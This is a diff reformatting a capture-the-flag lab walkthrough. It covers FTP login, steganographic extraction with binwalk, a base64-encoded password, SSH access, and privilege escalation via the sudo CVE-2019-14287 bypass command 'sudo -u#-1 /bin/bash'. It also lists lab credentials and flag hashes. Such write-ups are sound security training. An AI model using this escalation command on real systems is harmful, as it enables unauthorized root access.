@@ -56,7 +56,7 @@ Codename? Guessing the "Agent [letter]" is what they mean
 		 '''
 
 
----Possible Users---
+### Possible Users ###
 
 - Chris
 - R?
@@ -65,10 +65,10 @@ Codename? Guessing the "Agent [letter]" is what they mean
 
 # Intrusion #
 
----ChrisFTP---
+### ChrisFTP ###
 
-- ftp $IP
-	Name: chris
+- ftp $IP</br>
+	Name: chris</br>
 	Pass: crystal
 
 ftp > ls
@@ -80,31 +80,30 @@ ftp > ls
 	'''
 	
 ftp > mget To_agentJ cute-alien.jpg cutie.png
+
 ftp > exit
 
-//all right so we've got all Chris' files, let's see what's headers
 
 - To_agentJ.txt	
 
-'''
-Dear agent J,
+		'''
+		Dear agent J,
 
-All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+		All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
 
-From,
-Agent C
-'''
+		From,
+		Agent C
+		'''
 
-//oh okay stenography
 
----Stenography---
+### Steganography ###
 
 - binwalk cutie.png -e
 - ls _cutie.png.extracted
 
-'''
-365  365.zlib  8702.zip  To_agentR.txt
-'''
+		'''
+		365  365.zlib  8702.zip  To_agentR.txt
+		'''
 	8702.zip is password protected
 		(see #Passwords#)
 
@@ -112,14 +111,14 @@ Agent C
 	> pass: alien
 - To_agentR.txt
 
-'''
-Agent C,
+		'''
+		Agent C,
 
-We need to send the picture to 'QXJlYTUx' as soon as possible!
+		We need to send the picture to 'QXJlYTUx' as soon as possible!
 
-By,
-Agent R
-'''
+		By,
+		Agent R
+		'''
 	> QXJlYTUx
 		(see #Passwords#)
 
@@ -131,50 +130,53 @@ Agent R
 
 - message.txt
 
-'''
-Hi james,
+		'''
+		Hi james,
 
-Glad you find this message. Your login password is hackerrules!
+		Glad you find this message. Your login password is hackerrules!
 
-Don't ask me why the password look cheesy, ask agent R who set this password for you.
+		Don't ask me why the password look cheesy, ask agent R who set this password for you.
 
-Your buddy,
-chris
-'''
+		Your buddy,
+		chris
+		'''
 
 
----SSH---
+### SSH ###
 
 - ssh james@$IP
 	pass: hackerrules!
 
 - ls
 
-'''
-Alien_autospy.jpg  user_flag.txt
-'''
+		'''
+		Alien_autospy.jpg  user_flag.txt
+		'''
 
-**Flag Found**
-	/home/james/user_flag.txt: <b03d975e8c92a7c04146cfa7a5a313c7>
+*Flag Found*<details>
+	<summary>Spoiler</summary>
+		/home/james/user_flag.txt: b03d975e8c92a7c04146cfa7a5a313c7
+</details>
 
 
-
-#PrivEsc
+# PrivEsc #
 
 - sudo -l
 	> password protected, tried "hackerrules!" and succeeded
 	
-	"(ALL, !root) /bin/bash"
+		"(ALL, !root) /bin/bash"
 
-- searching "(ALL, !root) /bin/bash"
-	CVE: 2019-14287
-	"sudo -u#-1 /bin/bash"
+- searching "(ALL, !root) /bin/bash"</br>
+		
+		CVE: 2019-14287
+		"sudo -u#-1 /bin/bash"
 
-- root gain
+- root gained
 
-**Flag Found**
-	/root/root.txt: <b53a02f55b57d4439e3341834d70c062>
-
+*Flag Found*<details>
+	<summary>Spoiler</summary>
+	/root/root.txt: b53a02f55b57d4439e3341834d70c062
+</details>
 
 
 # Passwords #
@@ -203,4 +205,3 @@ Alien_autospy.jpg  user_flag.txt
 - message.txt
 	user: james
  	pass: hackerrules!
-
